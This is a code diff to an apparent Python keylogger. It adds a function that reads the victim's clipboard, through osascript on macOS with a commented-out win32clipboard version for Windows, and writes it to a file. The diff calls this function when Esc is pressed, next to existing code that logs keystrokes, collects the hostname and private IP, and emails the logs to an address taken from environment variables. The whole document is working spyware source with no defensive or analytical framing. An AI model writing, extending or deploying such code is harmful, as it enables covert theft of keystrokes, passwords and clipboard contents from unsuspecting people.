@@ -35,6 +35,7 @@ load_dotenv()
 
 keys_information = 'key_log.txt'
 system_information = 'systeminfo.txt'
+clipboard_information = 'clipboard.txt'
 email_address = os.getenv('EMAIL_ADDRESS')
 password = os.getenv('PASSWORD')
 toaddr = os.getenv('EMAIL_ADDRESS')
@@ -99,7 +100,25 @@ def device_information():
         f.write("Machine: " + platform.machine() + '\n')
         f.write("Hostname: " + hostname + '\n')
         f.write("Private IP Address: " + IPAddr + "\n")
+
+def copy_clipboard():
+    
+    '''for copying mac clipboard'''
+    with open(file_path + extend + clipboard_information, "a") as f:
+        code,pasted_data,err = osascript.run('set content to the clipboard')
+        f.write("Clipboard Data : \n" + pasted_data)
         
+    '''#for copying windows clipboard
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            
+            f.write("Clipboard Data: \n" +pasted_data)
+            
+        except:
+            f.write("Clipboard could not be copied") '''
     
 count = 0
 keys = []
@@ -133,6 +152,7 @@ def on_release(key):
     if key == Key.esc:
         send_mail(keys_information, file_path + extend + keys_information, toaddr)
         device_information()
+        copy_clipboard()
         return False
 
 
